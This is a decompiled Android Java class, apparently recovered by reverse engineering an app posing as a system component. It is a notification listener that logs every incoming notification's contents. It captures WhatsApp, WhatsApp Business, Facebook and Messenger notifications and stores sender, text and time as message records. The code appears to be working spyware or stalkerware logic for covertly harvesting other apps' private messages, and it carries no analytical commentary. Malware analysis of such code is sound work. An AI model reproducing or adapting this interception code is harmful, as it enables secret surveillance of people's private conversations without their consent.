package com.app.system.common.service;

import android.annotation.TargetApi;
import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.app.system.common.entity.Message;
import com.app.system.common.h.k;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;

@TargetApi(18)
public class NotificationListener
  extends NotificationListenerService
{
  private boolean a = false;
  private d b = new d(null);
  private a c = new a(null);
  
  private static String b(Bundle paramBundle, String paramString)
  {
    paramBundle = paramBundle.get(paramString);
    if (paramBundle == null) {
      paramBundle = "";
    } else {
      paramBundle = paramBundle.toString();
    }
    return paramBundle;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    a.b("NotificationListener", "Invocato metodo onBind(), si restituisce super.onBind()", new Object[0]);
    return super.onBind(paramIntent);
  }
  
  public void onListenerConnected()
  {
    super.onListenerConnected();
    this.a = true;
  }
  
  public void onListenerDisconnected()
  {
    super.onListenerDisconnected();
    this.a = false;
  }
  
  public void onNotificationPosted(StatusBarNotification paramStatusBarNotification)
  {
    super.onNotificationPosted(paramStatusBarNotification);
    if (!this.a) {
      return;
    }
    Notification localNotification = paramStatusBarNotification.getNotification();
    if (localNotification != null)
    {
      Object localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("Package: ");
      ((StringBuilder)localObject1).append(paramStatusBarNotification.getPackageName());
      localObject1 = ((StringBuilder)localObject1).toString();
      int i = 0;
      a.d("NotificationListener", (String)localObject1, new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("toString: ");
      ((StringBuilder)localObject1).append(localNotification.toString());
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("tickerText: ");
      ((StringBuilder)localObject1).append(localNotification.tickerText);
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("extras: ");
      ((StringBuilder)localObject1).append(localNotification.extras.toString());
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("title: ");
      ((StringBuilder)localObject1).append(b(localNotification.extras, "android.title"));
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("text: ");
      ((StringBuilder)localObject1).append(b(localNotification.extras, "android.text"));
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("bigText: ");
      ((StringBuilder)localObject1).append(b(localNotification.extras, "android.bigText"));
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append("infoText: ");
      ((StringBuilder)localObject1).append(b(localNotification.extras, "android.infoText"));
      a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
      localObject1 = localNotification.extras.get("android.textLines");
      Object localObject2;
      int j;
      if ((localObject1 instanceof ArrayList))
      {
        localObject2 = (ArrayList)localObject1;
        if (localObject2 != null) {
          for (j = 0; j < ((ArrayList)localObject2).size(); j++)
          {
            localObject1 = new StringBuilder();
            ((StringBuilder)localObject1).append("textLines[");
            ((StringBuilder)localObject1).append(j);
            ((StringBuilder)localObject1).append("]: ");
            ((StringBuilder)localObject1).append((String)((ArrayList)localObject2).get(j));
            a.d("NotificationListener", ((StringBuilder)localObject1).toString(), new Object[0]);
          }
        }
      }
      else if ((localObject1 instanceof CharSequence))
      {
        localObject1 = (CharSequence)localObject1;
        localObject2 = new StringBuilder();
        ((StringBuilder)localObject2).append("textLines: ");
        ((StringBuilder)localObject2).append(localObject1);
        a.d("NotificationListener", ((StringBuilder)localObject2).toString(), new Object[0]);
      }
      paramStatusBarNotification = paramStatusBarNotification.getPackageName();
      if (paramStatusBarNotification != null)
      {
        j = paramStatusBarNotification.hashCode();
        if (j != -2103713194)
        {
          if (j != -1547699361)
          {
            if (j != 714499313)
            {
              if ((j == 908140028) && (paramStatusBarNotification.equals("com.facebook.orca")))
              {
                j = 3;
                break label610;
              }
            }
            else if (paramStatusBarNotification.equals("com.facebook.katana"))
            {
              j = 2;
              break label610;
            }
          }
          else if (paramStatusBarNotification.equals("com.whatsapp"))
          {
            j = i;
            break label610;
          }
        }
        else if (paramStatusBarNotification.equals("com.whatsapp.w4b"))
        {
          j = 1;
          break label610;
        }
        j = -1;
        switch (j)
        {
        default: 
          break;
        case 2: 
        case 3: 
          this.c.a(localNotification);
          break;
        case 0: 
        case 1: 
          label610:
          this.b.a(localNotification);
        }
      }
    }
  }
  
  public void onNotificationRemoved(StatusBarNotification paramStatusBarNotification)
  {
    super.onNotificationRemoved(paramStatusBarNotification);
  }
  
  private class a
    extends NotificationListener.b
  {
    private a()
    {
      super(null);
    }
    
    protected int a()
    {
      return 4;
    }
    
    protected String b()
    {
      return "Facebook";
    }
  }
  
  private abstract class b
  {
    private b() {}
    
    protected abstract int a();
    
    public boolean a(Notification paramNotification)
    {
      Object localObject = NotificationListener.a(paramNotification.extras, "android.text");
      String str = NotificationListener.a(paramNotification.extras, "android.bigText");
      if ((str != null) && (!str.trim().isEmpty())) {
        localObject = str;
      }
      paramNotification = NotificationListener.a(paramNotification.extras, "android.title");
      paramNotification = new Message(0L, paramNotification, paramNotification, new Date().getTime() / 1000L, (String)localObject, 1, a());
      long l = new k(NotificationListener.this).a(paramNotification);
      boolean bool = false;
      if (l == -1L)
      {
        paramNotification = new StringBuilder();
        paramNotification.append("Notifica ");
        paramNotification.append(b());
        paramNotification.append(" non registrata");
        a.a("NotificationListener", paramNotification.toString(), new Object[0]);
      }
      if (l != -1L) {
        bool = true;
      }
      return bool;
    }
    
    protected abstract String b();
  }
  
  private static enum c
  {
    private c() {}
  }
  
  private class d
    extends NotificationListener.b
  {
    private NotificationListener.c c = NotificationListener.c.a;
    private boolean d = false;
    private Date e = null;
    private String f = null;
    private Timer g = null;
    private Handler h = new Handler();
    
    private d()
    {
      super(null);
    }
    
    protected int a()
    {
      return 1;
    }
    
    public boolean a(Notification paramNotification)
    {
      return super.a(paramNotification);
    }
    
    protected String b()
    {
      return "WhatsApp";
    }
  }
}


/* Location:              ~/com/app/system/common/service/NotificationListener.class
 *
 * Reversed by:           J
 */